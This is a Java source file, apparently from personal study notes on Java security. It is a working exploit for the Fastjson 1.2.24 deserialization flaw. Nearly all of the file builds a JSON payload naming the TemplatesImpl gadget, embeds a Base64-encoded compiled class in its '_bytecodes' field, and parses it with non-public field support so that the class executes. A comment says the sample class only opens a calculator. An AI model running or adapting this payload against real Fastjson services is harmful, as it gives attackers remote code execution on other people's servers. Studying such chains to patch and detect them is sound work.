import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

// TemplatesImpl 链子的 EXP
public class TemplatesImplChain {
    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]) {
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");

            // test.class用于弹计算器
            final String evilClassPath = "D:\\Coding\\C\\JavaHacker\\5 Fastjson基础\\2 Fastjson 1.2.24\\Code\\test.class";
            String evilCode = readClass(evilClassPath);

            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'hello','_tfactory':{ },\"_outputProperties\":{ },";
            System.out.println(text1);

            // 两种写法
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            // Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}